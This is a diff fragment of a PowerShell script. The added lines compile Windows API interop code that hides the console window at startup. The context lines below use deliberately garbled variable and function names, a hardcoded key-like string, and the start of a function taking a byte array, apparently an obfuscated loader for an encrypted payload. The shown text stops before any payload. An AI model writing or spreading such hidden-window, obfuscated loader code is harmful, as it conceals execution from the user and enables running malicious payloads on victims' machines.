@@ -1,3 +1,19 @@
+Add-Type -TypeDefinition '
+using System;
+using System.Runtime.InteropServices;
+public class ConsoleWindow {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
+
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+}
+'
+
+$hwnd = [ConsoleWindow]::GetConsoleWindow()
+if ($hwnd -ne [IntPtr]::Zero) {
+    [ConsoleWindow]::ShowWindow($hwnd, 0)
+}
 $She54y3etgsdfgdgdfgdfgdfgdfgdfgdfg = "WETWQTQWSGFSDf34t345t4353534534543534ir872324igh38759123842735";
 function be54yedfghe54ygwegsg {[CmdletBinding()] Param ([Parameter(Position = 0, Mandatory = $True)] 
         [byte[]] $SHe35ryegdsfgdfgdfgdfgdfd = $(Throw("-byteArray is required")) ); 
